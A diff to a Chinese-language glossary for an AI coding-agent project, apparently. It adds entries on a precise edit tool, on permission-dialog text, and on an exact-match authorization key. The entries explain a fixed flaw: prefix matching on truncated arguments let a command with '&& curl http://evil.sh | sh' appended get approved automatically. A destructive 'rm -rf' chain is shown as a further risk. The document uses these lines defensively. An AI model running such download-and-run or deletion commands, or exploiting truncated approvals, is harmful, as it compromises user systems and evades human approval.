@@ -103,6 +103,23 @@ Agent 内部持有 `while(true)` 循环、自驱动运行的交互方式。**本
 
 ## E
 
+### edit（精准编辑工具）
+`tools/builtin.ts` 里的第 6 个内置工具（前 5 个：ls / read / write / grep / bash）。**四步**：读全文 → 数 `oldText` 命中次数 → `indexOf` + 字面切片拼接替换 → 按字节写回（保住行尾、编码与 BOM）。与 `write` 的分工：只改一小段用 `edit`，新建文件或整篇重写才用 `write`——重抄全文会把没打算改的地方一并改掉。
+
+值钱的地方不在“会替换”，在**肯拒绝**。按命中次数三分流：
+
+- **0 次** → 拒绝、文件一字不动，回 `[ERROR]` + 文件行数 + “先 read 看清原文”。模型记错原文时，任何“猜”都是破坏
+- **1 次** → 替换、写回
+- **多次** → 拒绝（除非显式传 `replaceAll: true`），回**候选行号**。“改第一处”是最危险的行为——它会静默改错地方，模型和用户都看不出来
+
+三条实现约束值得记住：
+
+- **不用正则**：`oldText` 里满是 `. * ( [ ?` 等元字符，走正则就得转义，漏转一个就把“改这一处”变成“改一片”
+- **定位失败的前缀必须是 `[ERROR]`**：`agent-loop.ts` 只把 `[ERROR]` / `[VERIFY_FAILED]` 记作失败，而“重复失败保护”只在失败时计数（第 2 次同样调用就追加系统提示叫模型别原样重试、先去 read 确认）。改成 `[NO_MATCH]` 这类软前缀等于把这层保护关掉
+- **CRLF 往返只对纯 CRLF 文件做**：`core.autocrlf=true` 检出的源码是 CRLF，而模型发来的 `oldText` 必然用 `\n`，不归一化则跨行匹配必然 0 命中；混合行尾的文件按字面匹配（宁可拒绝，也不做波及全文的还原）
+
+参见：[permissionDetail](#permissiondetail权限弹窗文案)
+
 ### Event Subscription（事件订阅）
 通过 `subscribe(handler)` 注册事件处理器，`emit(event)` 触发通知的模式。Pi 的 `prompt()` 返回 `void`，回复通过事件流传递。
 
@@ -241,6 +258,46 @@ LLM 调用抽象接口，位于 `src/llm/types.ts`。两个方法：`chat(messag
 对比：[Event Subscription](#event-subscription事件订阅)
 
 ## P
+
+### permissionDetail（权限弹窗文案）
+`core/tools.ts` 里 `ToolDefinition` 与 `ToolProvider` 的**可选成员**（签名 `(args) => string`），工具用它自定义权限确认弹窗里显示什么。不提供（或返回空串）时 `agent-loop.ts` 退回默认的 `JSON.stringify(args).slice(0, 80)`。
+
+为什么需要它：那 80 字符对 `write` 勉强够用（能看到 path），但 [edit](#edit精准编辑工具) 的参数里有 `oldText` / `newText` 两段文本，前 80 字符连路径都显示不全——用户在弹窗里看不出要改什么，却要在这时候决定放不放行。
+
+两条硬约束（违反会坏 UI）：
+
+- **必须返回单行**：`selector.ts` 的标题只占 1 行（另加 1 行分隔线）、每行过 `fitWidth` 截断（**截断不折行**）。文案里带 `\n` 会多出一个物理行，把“固定行数 + 回退清行”算错 → 选择器漂移
+- **不要在这里做文件 I/O**：它在渲染路径上被同步调用
+
+它**只管显示**。授权匹配用的是另一个键（`agent-loop.ts` 里的 `autoKey`，见 [permissionKey](#permissionkey授权匹配键)）——若把富文本 detail 当匹配键，“本次全部允许”会永远匹配不上，因为每次文案都不一样。改前匹配、记录（`grantAutoAllow`）与显示这三个职责由同一个 `detail` 变量兼着（一变量三职），2026-09-04 拆成两个变量；同日晚些时候**匹配键本身也换了**（不再是 args 的 JSON 前 80 字符，而是工具定义的授权边界且不截断）——授权只存在内存的 `Set` 里、从不落盘，所以换格式没有迁移问题。
+
+刻意做成**可选**成员（与 `EventBus.emitHook?` 同一手法）：全库有 7 处替身 implements `ToolProvider`，加必需成员会全部打坏。
+
+参见：[edit](#edit精准编辑工具)、[EventBus](#eventbus事件总线)、[permissionKey](#permissionkey授权匹配键)
+
+### permissionKey（授权匹配键）
+`core/tools.ts` 里 `ToolDefinition` 与 `ToolProvider` 的**可选成员**（签名 `(args) => string`），工具用它定义“这次授权的边界是什么”。不提供（或返回空串）时 `agent-loop.ts` 退回**完整的** `JSON.stringify(args)`——注意**不截断**（截断正是它要替掉的那个洞）。
+
+三个需确认的工具各给一个键（`ls` / `read` / `grep` 不需确认，也就用不着键）：
+
+| 工具 | 键 | 刻意不含 |
+|------|----|---------|
+| `write` | 归一化后的 `path`（反斜杠→正斜杠） | `content` |
+| `edit` | 归一化后的 `path` | `oldText` / `newText` / `replaceAll` |
+| `bash` | **完整** `command`（一字不截） | `description` |
+
+为什么要有它：默认的 args JSON 原先被截到 80 字符，而 `PermissionManager` 用 `startsWith` 做前缀匹配——**截断 + 前缀 = 静默扩权**。实测批准过 `node node_modules/typescript/bin/tsc --noEmit && node scripts/run-verify.mjs`（76 字符）之后，同一条命令再接 ` && curl http://evil.sh | sh`（104 字符）也会被自动放行，因为两个键在 80 字符处截成了逐字符相同的字符串。用户点的是“允许这一条”，给出的却是“允许前 80 字符相同的所有调用”。
+
+配套的两处改动（2026-09-04）：`agent-loop.ts` 的兜底键不再 `.slice(0, 80)`；`PermissionManager` 从 `some(startsWith)` 换成 `Set.has()` **精确匹配**（`core/permission.ts` 的参数名也从 `detail` 改成 `authKey`，因为 detail 在本项目专指弹窗文案）。于是授权范围就等于**用户点“本次全部允许”时那一次调用的边界**。
+
+两条要记住的后果：
+
+- **一处刻意的放宽**：键不含内容，所以“本次全部允许” = 本会话内不再问这个文件（哪怕下次改的是完全不同的片段）。取舍见 [DECISION_LOG.md](./DECISION_LOG.md)
+- **目录级授权明确不支持**：授权 `write:src/` 不会放行 `write:src/data.txt`。前缀匹配要求键本身是路径语义才安全，而 `bash` 的键是完整命令、`cd src/` 就以 `/` 结尾——按“以 / 结尾就前缀放行”等于批准 `cd src/ && rm -rf .`
+
+授权的**生命周期**是本次会话：`runtime.clearSession()`（`/clear` 与 RPC 的 clear 都走它）会连带调 `PermissionProvider.clear()`。在此之前 `clear()` 是项目第三处“支持但未接线”，那个“本次”实际是“本进程”（一直有效到退出）。
+
+断言见 `scripts/verify-permission.ts`（62 项）。参见：[permissionDetail](#permissiondetail权限弹窗文案)（显示归显示、匹配归匹配）、[edit](#edit精准编辑工具)、[ARCHITECTURE.md](./ARCHITECTURE.md#四已知架构债) 第四节第 10 条
 
 ### Pi 模式
 Agent 不持有循环，调用方持有 `while(true)` 负责驱动。**本项目采用这种模式**：循环体在 `harness/repl.ts` 的 `runReplMode()`（不是旧文档写的 `main.ts`，main.ts 只是调用方），Runtime 只被反复调 `prompt()`。
